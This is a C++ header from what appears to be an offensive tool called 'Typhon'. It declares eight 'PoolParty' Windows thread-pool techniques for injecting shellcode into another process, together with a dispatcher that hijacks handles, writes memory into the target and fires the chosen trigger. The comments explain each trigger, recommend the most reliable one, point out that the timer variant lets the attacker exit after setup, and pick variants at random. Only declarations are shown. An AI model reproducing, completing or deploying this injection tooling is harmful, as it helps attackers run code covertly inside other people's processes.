#pragma once

// ============================================================================
// Typhon — All 8 Thread Pool Execution Primitives
// ============================================================================
// Each variant implements a different way to trigger code execution in the
// target process's thread pool. They all share the same memory writing
// primitives (section-backed injection) but differ in the execution trigger.
//
// Variant selection is PRNG-driven at runtime from the allowed set.
// ============================================================================

#include <stdint.h>
#include "poolparty_types.h"
#include "handle_hijack.h"
#include "memory_writer.h"

namespace PoolParty {

    // Variant identifiers (bitmask for selection)
    enum Variant : uint16_t {
        VARIANT_WORKER_FACTORY  = 0x0001,   // V1: Overwrite start routine
        VARIANT_TP_WORK         = 0x0002,   // V2: Task queue insertion
        VARIANT_TP_IO           = 0x0004,   // V3: I/O completion via file
        VARIANT_TP_WAIT         = 0x0008,   // V4: I/O completion via event
        VARIANT_TP_ALPC         = 0x0010,   // V5: I/O completion via ALPC
        VARIANT_TP_JOB          = 0x0020,   // V6: I/O completion via job object
        VARIANT_TP_DIRECT       = 0x0040,   // V7: Direct I/O completion
        VARIANT_TP_TIMER        = 0x0080,   // V8: Timer queue insertion

        // Groupings
        VARIANT_IO_COMPLETION   = 0x007C,   // V3-V7: All I/O completion variants
        VARIANT_SAFE            = 0x00FE,   // V2-V8: All non-destructive variants
        VARIANT_ALL             = 0x00FF,   // All variants
        VARIANT_RECOMMENDED     = 0x0040,   // V7: Most reliable single-syscall trigger
    };

    // Injection result
    struct InjectResult {
        bool        Success;
        Variant     VariantUsed;
        PVOID       ShellcodeAddress;   // Address of shellcode in target
        PVOID       StructureAddress;   // Address of TP_* structure in target
        bool        HandleHijackOk;
        bool        MemoryWriteOk;
        bool        ExecutionTriggerOk;
    };

    // ========================================================================
    // Individual Variant Implementations
    // ========================================================================

    namespace V1_WorkerFactory {
        // Overwrite TppWorkerThread start routine with shellcode, then force
        // a new worker thread to be created. DESTRUCTIVE — breaks thread pool.
        InjectResult Execute(
            HANDLE targetProcess,
            HandleHijack::HijackedHandles& handles,
            PVOID shellcode, SIZE_T shellcodeSize
        );
    }

    namespace V2_TpWork {
        // Craft a TP_WORK structure and insert it into the task queue's
        // doubly-linked list. Worker thread dequeues and executes.
        InjectResult Execute(
            HANDLE targetProcess,
            HandleHijack::HijackedHandles& handles,
            PVOID shellcode, SIZE_T shellcodeSize
        );
    }

    namespace V3_TpIo {
        // Associate a file with the target's I/O completion port, then
        // trigger a file write. Completion notification fires callback.
        InjectResult Execute(
            HANDLE targetProcess,
            HandleHijack::HijackedHandles& handles,
            PVOID shellcode, SIZE_T shellcodeSize
        );
    }

    namespace V4_TpWait {
        // Create a wait completion packet associated with the target's
        // I/O completion port, then signal an event.
        InjectResult Execute(
            HANDLE targetProcess,
            HandleHijack::HijackedHandles& handles,
            PVOID shellcode, SIZE_T shellcodeSize
        );
    }

    namespace V5_TpAlpc {
        // Create an ALPC port associated with the target's I/O completion
        // port, then send a message to trigger the callback.
        InjectResult Execute(
            HANDLE targetProcess,
            HandleHijack::HijackedHandles& handles,
            PVOID shellcode, SIZE_T shellcodeSize
        );
    }

    namespace V6_TpJob {
        // Create a job object associated with the target's I/O completion
        // port, then assign a process to trigger the notification.
        InjectResult Execute(
            HANDLE targetProcess,
            HandleHijack::HijackedHandles& handles,
            PVOID shellcode, SIZE_T shellcodeSize
        );
    }

    namespace V7_TpDirect {
        // Queue a TP_DIRECT structure directly to the I/O completion port
        // via NtSetIoCompletion. Simplest and most powerful variant.
        InjectResult Execute(
            HANDLE targetProcess,
            HandleHijack::HijackedHandles& handles,
            PVOID shellcode, SIZE_T shellcodeSize
        );
    }

    namespace V8_TpTimer {
        // Insert a TP_TIMER into the timer queue's red-black tree, then
        // set a timer to expire. Supports delayed execution — attacker
        // can exit after setup.
        InjectResult Execute(
            HANDLE targetProcess,
            HandleHijack::HijackedHandles& handles,
            PVOID shellcode, SIZE_T shellcodeSize,
            LONGLONG delayMs = 0   // 0 = immediate, >0 = delay in ms
        );
    }

    // ========================================================================
    // Dispatcher — PRNG-selected variant execution
    // ========================================================================

    // Inject shellcode into target process using a randomly selected variant
    // from the allowed set. Handles the full pipeline:
    //   1. Handle hijacking
    //   2. Section-backed memory injection
    //   3. Variant-specific execution trigger
    //   4. Cleanup
    InjectResult Inject(
        DWORD    targetPid,
        PVOID    shellcode,
        SIZE_T   shellcodeSize,
        uint16_t allowedVariants = VARIANT_RECOMMENDED,
        LONGLONG timerDelayMs = 0   // Only used if V8 is selected
    );

} // namespace PoolParty